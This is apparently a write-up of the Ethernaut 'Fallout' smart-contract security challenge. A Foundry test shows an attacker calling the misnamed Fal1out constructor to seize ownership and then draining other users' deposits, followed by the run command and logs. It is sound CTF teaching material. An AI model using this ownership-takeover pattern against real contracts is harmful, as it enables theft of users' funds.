# What is OpenZeppelin Ethernaut?

OpenZeppelin Ethernaut is an educational platform that provides interactive and gamified challenges to help users learn about Ethereum smart contract security. It is developed by OpenZeppelin, a company known for its security audits, tools, and best practices in the blockchain and Ethereum ecosystem.

OpenZeppelin Ethernaut Website: [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)

# What You're Supposed to Do?

in `02-Fallout` Challenge, You Should Try To find a Way to Take Ownership of the Contract.

`02-Fallout` Challenge Link: [https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639](https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639)

# How did i Complete This Challenge?

Take a Look at `testMaliciousActorTakesOwnershipFromOwnerThenDrainsFunds` test at `Fallout.t.sol`:

```javascript

    modifier multipleAllocationsFromDifferentUsers {
        address[] memory users = new address[](10);
        for (uint i = 0; i < 10; i++) {
            users[i] = address(uint160(i + 1));
            vm.startPrank(users[i]);
            vm.deal(users[i], 1 ether);
            fallout.allocate{value: 1 ether}();
            vm.stopPrank();
        }
        _;
    }

    function testMaliciousActorTakesOwnershipFromOwnerThenDrainsFunds() external multipleAllocationsFromDifferentUsers {
        vm.startPrank(owner);
        
        fallout.Fal1out{value: 1 ether}();
        console2.log("Owner Address: ", owner);
        console2.log("Malicious Actor Address: ", maliciousActor);

        vm.stopPrank();

        vm.startPrank(maliciousActor);

        console2.log("Current Owner Before The Malicious Actor Comes an Steals Ownership from the Real Owner: ", fallout.owner());
        fallout.Fal1out{value: 1 ether}();
        console2.log("Current Owner After The Malicious Actor Comes an Steals Ownership from the Real Owner: ", fallout.owner());

        uint256 falloutContractBalanceBeforeMaliciousActorDrainFunds = address(fallout).balance;
        fallout.collectAllocations();
        uint256 maliciousActorAccountBalanceBeforeMaliciousActorDrainFunds = address(maliciousActor).balance;

        assertEq(falloutContractBalanceBeforeMaliciousActorDrainFunds, maliciousActorAccountBalanceBeforeMaliciousActorDrainFunds);
        assertNotEq(owner, fallout.owner());
        assertEq(maliciousActor, fallout.owner());

        vm.stopPrank();
    }
```

in `testMaliciousActorTakesOwnershipFromOwnerThenDrainsFunds` test, first some Users Allocate their Money to this Smart Contract (multipleAllocationsFromDifferentUsers modifier).

Then `owner` takes the ownership of the contract by calling `Fal1out` function. After that, an Malicious Actor Takes ownership of the contract by Doing the same thing, then Drains the
Contract Funds with `collectAllocations` function.

You can run the Test by running this Command: (Required to Have Foundry Installed)

```javascript
    forge test --match-test testMaliciousActorTakesOwnershipFromOwnerThenDrainsFunds -vvvv
```

take a Look at first Few Lines to Find the `Logs`:

```javascript
    Logs:
        Owner Address:  0x7c8999dC9a822c1f0Df42023113EDB4FDd543266
        Malicious Actor Address:  0x195Ef46F233F37FF15b37c022c293753Dc04A8C3
        Current Owner Before The Malicious Actor Comes an Steals Ownership from the Real Owner:  0x7c8999dC9a822c1f0Df42023113EDB4FDd543266
        Current Owner After The Malicious Actor Comes an Steals Ownership from the Real Owner:  0x195Ef46F233F37FF15b37c022c293753Dc04A8C3
```
